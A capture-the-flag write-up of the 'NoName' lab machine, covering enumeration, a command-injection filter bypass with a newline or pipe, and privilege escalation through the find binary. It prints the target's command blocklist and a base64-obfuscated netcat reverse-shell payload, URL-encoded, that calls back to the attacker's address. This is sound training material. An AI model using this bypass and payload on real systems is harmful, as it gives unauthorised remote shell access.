# NoName

## Background

> NoName may appear easy, but not everything is always straightforward. Only local.txt and proof.txt are valid flags. 

- Author: [Yash Saxena](https://www.vulnhub.com/entry/haclabs-no_name,429/)

- Released on: Jul 20, 2020

- Difficulty: Intermediate

> Overall Difficulty for Me: Very Hard

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a2.png)

According to `rustscan` result, we have one port is opened:

Ports Open        | Service
------------------|------------------------
80                | Apache httpd 2.4.29

## HTTP on Port 80

In the `index.php`, there is a "fake query" that we can sumbit:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a3.png)

**Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a5.png)

Looks like a command injection but nothing respond?? Let's enumerate the web server much deeper with `gobuster`:

**Gobuster Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a6.png)

Found `/admin` directory!

**http://192.168.129.15/admin:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a8.png)

Found a passphrase: `harder`.

At this point, I tried harder to enumerate hidden directories, finding what the `index.php` does, and figuring what does the passphrase do. Turns out, those images are not exactly an image:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a10.png)

Nice! We found `superadmin.php`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a11.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a12.png)

And this time the ping's working!

# Initial Foothold

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a13.png)

Looks like there is a **filter** from preventing us to execute command!

To bypass the filter, I'll use the **new line** `\n`, or `%0A` in URL encoding. (Learned this trick from one of the OSCP lab machine.)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a15.png)

Yes!! We have command injection! Let's have a reverse shell!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a16.png)

Since the target machine has `python3` installed, I'll use python3 reverse shell.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a17.png)

And... Nothing happened.

Let's view the source code and see why it's not working:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a18.png)

```php
$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
```

It has an array of blacklisted strings that blocking us from using: `;`, `&&`, `/`, `bin`, `&`, ` &&`, `ls`, `nc`, `dir`, `pwd`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a19.png)

Since the target machine also has `base64` installed, why not base64 **encode** our reverse shell, and then base64 **decode** it in the target machine? I also notice the **pipe** (`|`) can also bypass the filter, as it's not in the blacklist.

1. Base64 encode the `nc` reverse shell: (From [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a20.png)

**Complete payload:**
```bash
|echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4xMjkgNDQzID4vdG1wL2YK" | base64 -d | bash
```

2. URL encode our payload: (https://www.urlencoder.org/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a21.png)

**Final payload:**
```bash
%7Cecho%20%22cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgMTkyLjE2OC40OS4xMjkgNDQzID4vdG1wL2YK%22%20%7C%20base64%20-d%20%7C%20bash
```

3. Setup a `nc` listener and send the payload via `curl`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a22.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a23.png)

We're now `www-data`!

**local.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a28.png)

**Upgrade to Fully Interactive Shell via `socat`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a24.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a25.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a26.png)

# Privilege Escalation

> **There are 2 ways to escalate to root:**

1. From `www-data` straight to root:

## www-data to root

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a27.png)

Found 2 users: `haclabs` and `yash`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a29.png)

Interesting...

**SUID:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a30.png)

Found `/usr/bin/find` has a SUID bit set.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a31.png)

According to [GTFOBins](https://gtfobins.github.io/gtfobins/find/), if the `find` binary has SUID bit set, we can escalate our privilege! Let's copy and paste that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a32.png)

And I'm root! :D. But what does the `flag1.txt` saying? Am I missing something?

2. From `www-data` to `haclabs` to `root`:

## www-data to haclabs

In the `yash`'s home directory, the `flag1.txt` said `yash` saved `haclabs` in somewhere.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a34.png)

We can use `find` to find that hidden file.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a35.png)

Found `/usr/share/hidden/.passwd`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a36.png)

- Username:haclabs
- Password:haclabs1234

**Switch User to `haclabs`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a37.png)

I'm `haclabs`!

## haclabs to root

**sudo -l:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a38.png)

User `haclabs` is able to run `sudo find` as root without password!!

According to [GTFOBins](https://gtfobins.github.io/gtfobins/find/), the `find` binary can spawn an interactive shell, thus we can escalate our privilege! Let's copy and paste that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a39.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a40.png)

And I'm root! :D

# Rooted

**proof.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/NoName/images/a33.png)

# Conclusion

What we've learned:

1. Directory Enumeration
2. Steganography
3. Command Injection
4. Bypassing Filter
5. Privilege Escalation via `find` SUID bit set
6. Privilege Escalation via Hidden File That Contains Cleartext Password
7. Privilege Escalation via Running `find` With Sudo to Spawn An Interactive Shell